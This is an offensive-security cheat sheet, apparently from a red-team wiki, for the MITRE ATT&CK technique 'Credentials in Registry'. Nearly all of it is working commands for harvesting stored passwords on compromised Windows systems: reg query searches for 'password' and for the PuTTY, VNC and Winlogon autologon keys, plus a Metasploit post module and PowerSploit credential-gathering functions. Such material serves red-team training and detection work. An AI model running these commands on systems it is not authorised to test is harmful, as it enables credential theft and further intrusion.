---
description: https://attack.mitre.org/techniques/T1552/002/
---

# Credentials in Registry

**ATT\&CK ID:** [T1552.002](https://attack.mitre.org/techniques/T1552/002/)

**Permissions Required:** <mark style="color:orange;">**Various**</mark>

**Description**

Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

## Techniques

### CMD

```bash
# String matching in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /t REG_SZ /s

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

### Metasploit

```
post/windows/gather/credentials/windows_autologin
```

### PowerSploit

**URL:** [https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc)

```bash
# Import privesc module
# Import-Module .\Privesc.psd1

Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```
